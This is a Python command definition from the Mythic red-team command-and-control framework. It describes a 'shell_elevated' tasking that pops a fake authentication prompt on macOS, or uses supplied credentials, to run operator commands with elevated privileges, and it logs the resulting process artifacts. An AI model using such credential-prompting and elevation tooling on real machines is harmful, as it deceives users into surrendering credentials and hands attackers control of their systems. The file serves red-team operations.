from CommandBase import *
import json
from MythicResponseRPC import *


class ShellElevatedArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "command": CommandParameter(
                name="command",
                type=ParameterType.String,
                description="Command to execute",
            ),
            "use_creds": CommandParameter(
                name="use_creds",
                type=ParameterType.Boolean,
                description="Use supplied creds or prompt the user for creds",
            ),
            "user": CommandParameter(
                name="user", type=ParameterType.Credential_Account,
                required=False
            ),
            "credential": CommandParameter(
                name="credential", type=ParameterType.Credential_Value,
                required=False
            ),
            "prompt": CommandParameter(
                name="prompt",
                type=ParameterType.String,
                description="What prompt to display to the user when asking for creds",
                required=False
            ),
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                raise ValueError("Missing JSON arguments")
        else:
            raise ValueError("Missing arguments")


class ShellElevatedCommand(CommandBase):
    cmd = "shell_elevated"
    needs_admin = False
    help_cmd = "shell_elevated"
    description = """
    The command will pop a dialog box for the user asking for them to authenticate (fingerprint reader too) so that the command you entered will be executed in an elevated context. Alternatively, you can supply a username and password and the command will run under their context (assuming they have the right permissions). Once you successfully authenticate, you have a time window where no more popups will occur, but you'll still execute subsequent commands in an elevated context.

WARNING! THIS IS SINGLE THREADED, IF YOUR COMMAND HANGS, THE AGENT HANGS!
    """
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = "@its_a_feature_"
    attackmapping = ["T1059", "T1141", "T1169"]
    argument_class = ShellElevatedArguments

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        resp = await MythicResponseRPC(task).register_artifact(
            artifact_instance="/usr/libexec/security_authtrampoline /System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid auth 15 /System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid /bin/sh -c {}".format(task.args.get_arg("command")),
            artifact_type="Process Create",
        )
        resp = await MythicResponseRPC(task).register_artifact(
            artifact_instance="/System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid /System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid /bin/sh -c {}".format(task.args.get_arg("command")),
            artifact_type="Process Create",
        )
        resp = await MythicResponseRPC(task).register_artifact(
            artifact_instance="/System/Library/ScriptingAdditions/StandardAdditions.osax/Contents/MacOS/uid /bin/sh -c {}".format(task.args.get_arg("command")),
            artifact_type="Process Create",
        )
        resp = await MythicResponseRPC(task).register_artifact(
            artifact_instance="/bin/sh -c {}".format(task.args.get_arg("command")),
            artifact_type="Process Create",
        )
        resp = await MythicResponseRPC(task).register_artifact(
            artifact_instance="{}".format(task.args.get_arg("command")),
            artifact_type="Process Create",
        )
        return task

    async def process_response(self, response: AgentResponse):
        pass
